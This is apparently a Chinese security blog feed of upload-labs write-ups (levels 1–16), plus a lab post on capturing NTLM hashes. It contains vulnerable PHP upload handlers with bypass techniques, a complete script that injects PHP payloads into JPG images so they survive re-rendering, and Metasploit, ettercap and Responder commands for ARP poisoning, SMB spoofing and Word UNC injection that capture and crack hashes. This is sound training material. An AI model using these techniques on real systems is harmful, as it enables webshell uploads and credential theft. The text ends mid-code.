class="headerlink" title="level 14"></a>level 14</h2><p>后端处理代码如下：</p><pre><code class="php">function isImage($filename){    $types = &#39;.jpeg|.png|.gif&#39;;    if(file_exists($filename)){        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);        if(stripos($types,$ext)&gt;=0){            return $ext;        }else{            return false;        }    }else{        return false;    }}$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $res = isImage($temp_file);    if(!$res){        $msg = &quot;文件未知，上传失败！&quot;;    }else{        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传出错！&quot;;        }    }}</code></pre><p>用了getimagesize()检查是否为图片文件<br><img src="https://s2.ax1x.com/2019/10/13/uvpQQx.png" alt="uvpQQx.png"></p><p>好像没啥用，用上面的方法继续过就好<br><img src="https://s2.ax1x.com/2019/10/13/uvpNYd.png" alt="uvpNYd.png"></p><p>文件包含如下：<br><img src="https://s2.ax1x.com/2019/10/13/uvp2fs.png" alt="uvp2fs.png"></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>又是用一个函数来判断是不是图片，，，，方法和上面一样就好</p><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>后端处理代码：</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])){    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false){                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = &quot;上传出错！&quot;;        }    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false){                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            }else{                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           }        } else {            $msg = &quot;上传出错！&quot;;        }    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){        if(move_uploaded_file($tmpname,$target_path)){            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false){                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            }else{                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            }        } else {            $msg = &quot;上传出错！&quot;;        }    }else{        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    }}</code></pre><p>提示是：</p><pre><code>本pass重新渲染了图片！</code></pre><p>参考文章：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析 - 先知社区</a></p><p>采用国外大牛编写的脚本jpg_payload.php.</p><pre><code class="php">&lt;?php    /*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg&gt;    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {        die(&#39;php-gd is not installed&#39;);    }    if(!isset($argv[1])) {        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);    }    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) {        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) {            die(&#39;Incorrect SOI marker&#39;);        }        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) {                $startPos = $dis-&gt;seek();                $outStreamTmp =                     substr($outStream, 0, $startPos) .                     $miniPayload .                     str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                     substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) {                    while((!$dis-&gt;eof())) {                        if($dis-&gt;readByte() === 0xFF) {                            if($dis-&gt;readByte !== 0x00) {                                break;                            }                        }                    }                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                         substr($outStream, 0, $startPos) .                         $miniPayload .                         substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                 substr($outStream, $stopPos);                } elseif($correctImage) {                    $outStream = $outStreamTmp;                } else {                    break;                }                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {                    die(&#39;Success!&#39;);                } else {                    break;                }            }        }    }    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) {        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    }    function custom_error_handler($errno, $errstr, $errfile, $errline) {        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {            if(isset($m[1])) {                $extraBytes = (int)$m[1];            }        }    }    class DataInputStream {        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) {            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) {                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            } else {                $this-&gt;binData = $filename;            }            $this-&gt;size = strlen($this-&gt;binData);        }        public function seek() {            return ($this-&gt;size - strlen($this-&gt;binData));        }        public function skip($skip) {            $this-&gt;binData = substr($this-&gt;binData, $skip);        }        public function readByte() {            if($this-&gt;eof()) {                die(&#39;End Of File&#39;);            }            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        }        public function readShort() {            if(strlen($this-&gt;binData) &lt; 2) {                die(&#39;End Of File&#39;);            }            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) {                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            } else {                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            }            return $short;        }        public function eof() {            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        }    }?&gt;</code></pre><p>先上传一张图片，然后把上传成功的图片下载下来<br><img src="https://s2.ax1x.com/2019/10/13/uvCyGj.png" alt="uvCyGj.png"></p><p>之后如下：<br><img src="https://s2.ax1x.com/2019/10/13/uvPkOP.png" alt="uvPkOP.png"></p><p>上传+文件包含<br><img src="https://s2.ax1x.com/2019/10/13/uvPJTU.png" alt="uvPJTU.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>NTM_HASH获取实验</title>
      <link href="/posts/709f1946.html"/>
      <url>/posts/709f1946.html</url>
      <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>当在内网没有思路的时候可以尝试hash钓鱼来获取突破口，常见的钓鱼方法有</p><ul><li>DNS劫持，嗅探获取hash</li><li>SMB伪造，嗅探获取hash</li><li>Word欺骗，获取hash</li><li>使用Responder辅助获取hash</li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>kali:192.168.241.157 windows server 2008:192.168.241.158</code></pre><h2 id="DNS劫持嗅探获取hash"><a href="#DNS劫持嗅探获取hash" class="headerlink" title="DNS劫持嗅探获取hash"></a>DNS劫持嗅探获取hash</h2><p>ettercap配置好DNS劫持，先删除/etc/ettercap/etter.dns里面的内容，然后写入</p><pre><code>* A  192.168.241.157</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXlrjS.png" alt="uXlrjS.png"></p><p>执行以下的操作:</p><pre><code>ettercap -G选择网卡Hosts-&gt;Scan for hosts-&gt;hosts list</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uX1k4I.png" alt=""></p><p>执行以下操作:</p><pre><code>选择192.168.241.158这个IPMitm-&gt;ARP Poisoning</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uX1KbQ.png" alt="uX1KbQ.png"></p><p><img src="https://s2.ax1x.com/2019/10/12/uX14IA.png" alt="uX14IA.png"></p><p>完事，目标机所走的流量都会转发到attack机上<br><img src="https://s2.ax1x.com/2019/10/12/uX8STH.png" alt=""></p><p>此时启动msfconsole，使用以下模块<br><img src="https://s2.ax1x.com/2019/10/12/uXGqsK.png" alt="uXGqsK.png"></p><p>之后，受害机无论访问什么网页都会弹出一个框框，要求输出凭证<br><img src="https://s2.ax1x.com/2019/10/12/uXGgMV.png" alt="uXGgMV.png"></p><p>此时用户如果输入了密码，则会抓到hash<br><img src="https://s2.ax1x.com/2019/10/12/uXJmJs.png" alt="uXJmJs.png"></p><p>使用john破解捕获到的hash<br><img src="https://s2.ax1x.com/2019/10/12/uXJbfs.png" alt="uXJbfs.png"></p><p>PS:记得msf里面设置保存的hash路径，否则不会保存文件。我这里拿别人的图（- -！）</p><h2 id="通过捕获smb流量获取hash"><a href="#通过捕获smb流量获取hash" class="headerlink" title="通过捕获smb流量获取hash"></a>通过捕获smb流量获取hash</h2><p>先用以下模块创建一个临时SMB，然后在启用抓取模块</p><pre><code>use auxiliary/server/capture/smbset srvhost 192.168.241.157set johnpwfile /root/Desktop_hashrun</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXD13D.png" alt="uXD13D.png"></p><p>此时可以看见本地的445端口在工作<br><img src="https://s2.ax1x.com/2019/10/12/uXDYDA.png" alt="uXDYDA.png"></p><p>启动smb流量监听模块</p><pre><code>use auxiliary/nbns/nbns_responseset SPOOFIP 192.168.241.157set INTERFACE eth0run</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXrVG8.png" alt="uXrVG8.png"></p><p>此时只要受害机访问attack的smb服务并输入用户的话将会捕获hash<br><img src="https://s2.ax1x.com/2019/10/12/uXrBIx.png" alt="uXrBIx.png"></p><p>如图<br><img src="https://s2.ax1x.com/2019/10/12/uXrsJK.png" alt="uXrsJK.png"></p><p>john破解<br><img src="https://s2.ax1x.com/2019/10/12/uXrqyQ.png" alt="uXrqyQ.png"></p><h2 id="通过Word获取hash"><a href="#通过Word获取hash" class="headerlink" title="通过Word获取hash"></a>通过Word获取hash</h2><pre><code>use auxiliary/docx/word_unc_injectorset LHOST 192.168.241.157run</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXszBd.png" alt="uXszBd.png"></p><p>同样使用</p><pre><code>use auxiliary/server/capture/smbset srvhost 192.168.241.157set johnpwfile /root/Desktop_hashrun</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXyRUI.png" alt="uXyRUI.png"></p><p>此时在受害机上打开word将捕获到hash<br><img src="https://s2.ax1x.com/2019/10/12/uX2rFA.png" alt="uX2rFA.png"></p><p>收到hash<br><img src="https://s2.ax1x.com/2019/10/12/uX2ROS.png" alt="uX2ROS.png"></p><h2 id="使用Responder辅助获取hash"><a href="#使用Responder辅助获取hash" class="headerlink" title="使用Responder辅助获取hash"></a>使用Responder辅助获取hash</h2><p>仓库地址：</p><pre><code>https://github.com/SpiderLabs/Responder</code></pre><p>执行</p><pre><code>python Responder.py -i 192.168.241.157 -I eth0</code></pre><p><img src="https://s2.ax1x.com/2019/10/12/uXTFdf.png" alt="uXTFdf.png"></p><p>然后在受害机访问192.168.241.157将获取hash<br><img src="https://s2.ax1x.com/2019/10/12/uXTnQs.png" alt="uXTnQs.png"></p><p>在受害者看来是一个访问错误<br><img src="https://s2.ax1x.com/2019/10/12/uXTJW4.png" alt="uXTJW4.png"></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>upload-master lvel 6 - level 10</title>
      <link href="/posts/1860a963.html"/>
      <url>/posts/1860a963.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="小序"><a href="#小序" class="headerlink" title="小序"></a>小序</h2><p>upload-master lvel 6 -level 10</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1570557971695&amp;di=53c5568d19a7105eed93886a85922950&amp;imgtype=0&amp;src=http%3A%2F%2Fn.sinaimg.cn%2Fsinacn17%2F87%2Fw1080h607%2F20180717%2Fc282-hfkffam4130126.jpg" alt=""></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><strong>第6题</strong></p><p>后端：黑名单的后端，黑名单很完善</p><p>缺陷：没有过滤空格，导致可以在后缀后面加空格绕过判断</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file,$img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件不允许上传&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p><img src="https://s2.ax1x.com/2019/10/08/uhokc9.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/10/08/uhoQ9e.md.png" alt=""></p><p><strong>第7题</strong></p><p>后端：空格首尾删除补上了</p><p>缺陷：由于.在windows上会自动删除，所以只要在后缀上加上.就可以绕过</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件类型不允许上传！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p><img src="https://s2.ax1x.com/2019/10/08/uhoR4U.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/10/08/uho4gJ.png" alt=""></p><p><strong>第8题</strong></p><p>后端：首尾去空，删除最后的.</p><p>缺陷：把<code>::$DATA</code>忘记删了，windows上会自动删除<code>::$DATA</code></p><p><img src="https://s2.ax1x.com/2019/10/08/uhTZvj.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/10/08/uhTMV0.png" alt=""></p><p><strong>第9题</strong></p><p>后端：这黑名单写的比较绝…</p><p>缺陷：Apache或Nginx配置不当导致解析漏洞可造成此黑名单的死亡</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件类型不允许上传！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p><strong>第10题</strong></p><p>后端：不管上传什么，删除后缀</p><p>缺陷：双写绕过</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) {            $is_upload = true;        } else {            $msg = &#39;上传出错！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p><img src="https://s2.ax1x.com/2019/10/08/uh7pz4.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/10/08/uh7Adx.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>upload-master level 1 - level 5</title>
      <link href="/posts/ed8edd7e.html"/>
      <url>/posts/ed8edd7e.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=138922&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建了几个靶场来玩，之前在网上看见有人在做upload-master。那么也下载个来试试水温</p><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1570369525327&amp;di=f44b51aebdcf8e9635ea8f1bedb1cf41&amp;imgtype=0&amp;src=http%3A%2F%2Fpics5.baidu.com%2Ffeed%2F42166d224f4a20a4bdad30040aeaf427700ed084.png%3Ftoken%3D2f0f162ecb1f3db9aa8a858d31df7d95%26s%3DD228B345D871148EAE8270F303009028" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p> 仓库地址：</p><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><p>自己创建一个upload的文件夹</p><p><img src="https://s2.ax1x.com/2019/10/06/ucze1g.png" alt=""></p><p><strong>level 1</strong></p><p>第一题是js验证，代码如下</p><pre><code class="php">&lt;?phpfunction checkFile() {    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;    if (file == null || file == &quot;&quot;) {        alert(&quot;请选择要上传的文件!&quot;);        return false;    }    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    }}    ?&gt;</code></pre><p>从html中发现端详</p><p><img src="https://s2.ax1x.com/2019/10/06/uczMBn.png" alt=""></p><p>将马子改后缀为jpg然后上传的时候burp抓包将后缀改回php</p><p><img src="https://s2.ax1x.com/2019/10/06/uczwH1.png" alt=""></p><p><strong>level 2</strong></p><p>第二天是判断<code>Content-Type</code>头，代码如下：</p><pre><code class="php">&lt;?php$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]                        if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;文件类型不正确，请重新上传！&#39;;        }    } else {        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;    }} ?&gt;</code></pre><p>可以和上一题一样进行上传，或者直接上传php，然后把头改为<code>Contenet-Type: image/png</code></p><p><img src="https://s2.ax1x.com/2019/10/06/uczwH1.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/10/06/ucz78S.png" alt=""></p><p><strong>level 3</strong></p><p>第三题是黑名单检测</p><pre><code class="php">&lt;? $is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) {                 $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }} php?&gt;</code></pre><p>这里有几个操作</p><ul><li>使用windows下会自动删除的字符，例如::$DATA或.</li><li>上传.htacess，设置指定名称来解析为php</li><li>上传其他名称，如:php1,php2,php3,php5,php32,phtml</li><li>00截断</li></ul><p><img src="https://s2.ax1x.com/2019/10/06/ugSlKH.png" alt=""></p><p><strong>level 4</strong></p><p>第四题也是黑名单，代码如下</p><pre><code class="php">&lt;?php$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = 